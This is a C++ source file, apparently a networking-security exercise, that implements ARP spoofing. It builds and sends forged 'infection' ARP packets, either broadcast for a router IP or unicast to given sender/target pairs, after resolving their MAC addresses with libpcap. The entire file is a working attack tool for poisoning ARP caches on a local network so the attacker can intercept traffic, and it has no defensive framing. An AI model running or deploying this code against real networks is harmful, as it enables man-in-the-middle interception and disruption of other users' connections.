#include "ethhdr.h"
#include "arphdr.h"
#include "utill.h"

#define MAC_ADDR_LEN 6

struct DeviceAddress
{
        Mac mac;
        Ip ip;
};

int main(int argc, char *argv[])
{
        if (argc <= 2)
        {
            usage();
            return -1;
        }

        char *dev = argv[1]; // 네트워크 인터페이스 명
        char errbuf[PCAP_ERRBUF_SIZE];

        pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr)
        {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }
        DeviceAddress attacker, sender, target;
        attacker.ip = getMyIp(dev);
        attacker.mac = Mac::getMyMac(dev);
        
        if (argc == 3)
        { // broadcat 모드
                target.ip = Ip(argv[2]); // 라우터
                EthArpPacket BroadcastArpPacket = Make_Infection_Packet(
                        attacker.mac, Mac::nullMac(),
                        Ip("0.0.0.0"), target.ip,
                        Mode::Broadcast
                        );
                sendPacket(handle, (const u_char*)&BroadcastArpPacket, sizeof(EthArpPacket));
        }
        else
        { // 유니캐스트 모드
                if (argc % 2 != 0)
                {
                        usage();
                        return -1;
                }

                // getting target(router) mac just one time

                for (int i = 2; i < argc - 1; i += 2)
                {
                        sender.ip = Ip(argv[i]);
                        target.ip = Ip(argv[i + 1]);

                        EthArpPacket query_sender = Make_Normal_Packet(attacker.mac, attacker.ip, sender.ip);
                        sender.mac = get_mac(handle, reinterpret_cast<const u_char *>(&query_sender), sizeof(EthArpPacket), sender.ip);

                        if (target.mac == Mac::nullMac()) {
                                EthArpPacket query_target = Make_Normal_Packet(attacker.mac, attacker.ip, target.ip);
                                target.mac = get_mac(handle, reinterpret_cast<const u_char *>(&query_target), sizeof(EthArpPacket), target.ip);
                        }

                        EthArpPacket infection_packet = Make_Infection_Packet(
                                attacker.mac,
                                sender.mac,
                                sender.ip,
                                target.ip,
                                Mode::Unicast
                                );
                        sendPacket(handle, reinterpret_cast<const u_char *>(&infection_packet), sizeof(EthArpPacket));
                }
        }

        pcap_close(handle);
        return 0;
}
